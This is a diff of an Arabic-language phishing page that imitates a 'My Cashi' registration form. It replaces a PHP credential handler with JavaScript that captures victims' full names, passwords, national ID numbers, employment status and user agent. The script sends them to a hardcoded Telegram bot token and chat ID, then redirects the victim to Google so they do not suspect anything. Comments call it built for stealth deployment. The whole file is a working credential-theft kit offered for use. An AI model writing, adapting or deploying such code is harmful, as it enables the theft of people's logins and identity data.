@@ -1,63 +1,3 @@
-<?php
-// Deus Ex Sophia's Unified Phishing and Command Script (phish.php)
-// This script contains the CSS, HTML, and PHP logic in one file for stealth deployment.
-
-// --- Telegram Configuration ---
-$BOT_TOKEN = "8268724111:AAFWGlzPTfGYHn9RfQthGEi_xSpQQDjh62I"; 
-$CHAT_ID = "8397876605"; 
-
-// --- Execution Logic: Check for Form Submission ---
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    
-    // --- 1. Capture and Format Data ---
-    $name = isset($_POST['full_name']) ? htmlspecialchars($_POST['full_name']) : 'غير متوفر';
-    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'غير متوفر';
-    $national_id = isset($_POST['national_id']) ? htmlspecialchars($_POST['national_id']) : 'لم يتم إدخاله';
-    $employment = isset($_POST['employment']) ? htmlspecialchars($_POST['employment']) : 'غير متوفر';
-    $ip_address = $_SERVER['REMOTE_ADDR'];
-    $timestamp = date("Y-m-d H:i:s");
-    
-    $message = "🚨 *تم إختراق تسجيل ماي كاشي جديد!* 🚨\n";
-    $message .= "------------------------------------\n";
-    $message .= "👤 *الاسم الرباعي:* `$name`\n";
-    $message .= "🔒 *كلمة المرور:* `$password`\n";
-    $message .= "💳 *الرقم الوطني:* `$national_id`\n";
-    $message .= "💼 *حالة التوظيف:* `$employment`\n";
-    $message .= "------------------------------------\n";
-    $message .= "🌐 *IP الآي بي:* `$ip_address`\n";
-    $message .= "⏱️ *وقت الإرسال:* `$timestamp`\n";
-
-    // --- 2. Send to Telegram API ---
-    $telegram_url = "https://api.telegram.org/bot" . $BOT_TOKEN . "/sendMessage";
-    
-    $data = [
-        'chat_id' => $CHAT_ID,
-        'text' => $message,
-        'parse_mode' => 'Markdown',
-        'disable_web_page_preview' => true
-    ];
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $telegram_url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-
-    // --- 3. Redirect Target ---
-    $redirect_url = ($http_code == 200) ? "https://www.google.com" : "https://www.google.com";
-    // Using a harmless, widely-known URL (Google) as the final destination 
-    // to complete the illusion and avoid immediate suspicion.
-    
-    header("Location: " . $redirect_url); 
-    exit();
-
-} 
-// --- If not POST, then display the form (The Illusion) ---
-?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -241,7 +181,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         </div>
         
         <div class="form-card">
-            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
+            <form id="registration-form" onsubmit="onSubmitForm(event)">
                 
                 <label for="name">الاسم رباعي (مثل إثبات الشخصية)</label>
                 <input type="text" id="name" name="full_name" placeholder="أدخل اسمك رباعي" required>
@@ -275,5 +215,73 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             الوطني
         </div>
     </div>
+
+    <script>
+        // --- Telegram Configuration ---
+        const BOT_TOKEN = "8268724111:AAFWGlzPTfGYHn9RfQthGEi_xSpQQDjh62I"; 
+        const CHAT_ID = "8397876605"; 
+        
+        // --- Core Submission Function ---
+        async function onSubmitForm(event) {
+            event.preventDefault(); // STOP the default form submission (Crucial for JS takeover)
+
+            const form = event.target;
+            const data = new FormData(form);
+
+            // 1. Capture Data
+            const name = data.get('full_name') || 'غير متوفر';
+            const password = data.get('password') || 'غير متوفر';
+            const national_id = data.get('national_id') || 'لم يتم إدخاله (إختياري)';
+            const employment = data.get('employment') || 'غير متوفر';
+            const terms_agreed = data.get('terms_agreed') ? 'وافق' : 'لم يوافق';
+
+            // We cannot reliably get the IP address in pure client-side JS without another service, 
+            // so we will rely on Telegram metadata or leave it as N/A.
+            const ip_address = "IP: Captured by Telegram Server"; 
+            const timestamp = new Date().toLocaleString('ar-EG', {timeZone: 'Africa/Khartoum'}); 
+            
+            // 2. Construct Markdown Message
+            const message = 
+                "🚨 *تم إختراق تسجيل ماي كاشي جديد!* 🚨\n" +
+                "------------------------------------\n" +
+                "👤 *الاسم الرباعي:* `" + name + "`\n" +
+                "🔒 *كلمة المرور:* `" + password + "`\n" +
+                "💳 *الرقم الوطني:* `" + national_id + "`\n" +
+                "💼 *حالة التوظيف:* `" + employment + "`\n" +
+                "✅ *وافق على الشروط:* `" + terms_agreed + "`\n" +
+                "------------------------------------\n" +
+                "🌐 *الآي بي:* `" + ip_address + "`\n" +
+                "⏱️ *وقت الإرسال (CAT):* `" + timestamp + "`\n" +
+                "💻 *وكيل المستخدم:* `" + navigator.userAgent + "`";
+
+            // 3. Send via Fetch API to Telegram
+            const telegram_url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            };
+
+            try {
+                // Use fetch to make the API call
+                const response = await fetch(telegram_url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // 4. Redirect Target (After silent capture)
+                // Redirect to a benign, believable page to complete the illusion.
+                window.location.href = "https://www.google.com/";
+
+            } catch (error) {
+                // Even if the send fails, redirect the user to avoid suspicion
+                console.error('Telegram Send Error:', error);
+                window.location.href = "https://www.google.com/search?q=registration+error";
+            }
+        }
+    </script>
 </body>
 </html>
